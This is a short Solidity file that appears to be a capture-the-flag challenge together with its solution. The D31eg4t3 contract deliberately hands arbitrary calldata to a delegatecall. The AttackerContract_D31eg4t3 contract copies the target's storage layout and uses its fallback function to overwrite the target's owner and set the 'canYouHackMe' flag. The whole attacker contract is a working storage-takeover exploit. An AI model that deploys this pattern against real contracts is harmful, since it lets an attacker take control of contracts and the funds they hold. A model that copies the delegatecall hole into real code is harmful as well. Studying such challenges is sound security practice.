// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{


    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}

contract AttackerContract_D31eg4t3 {
     uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    address public target;


    function call_target(address _target) public {
        target =  _target;
        D31eg4t3(target).hackMe(abi.encodePacked(bytes4(0x0000dead)));
    }
    fallback() external {
        owner = tx.origin;
        canYouHackMe[tx.origin] = true;
    }
}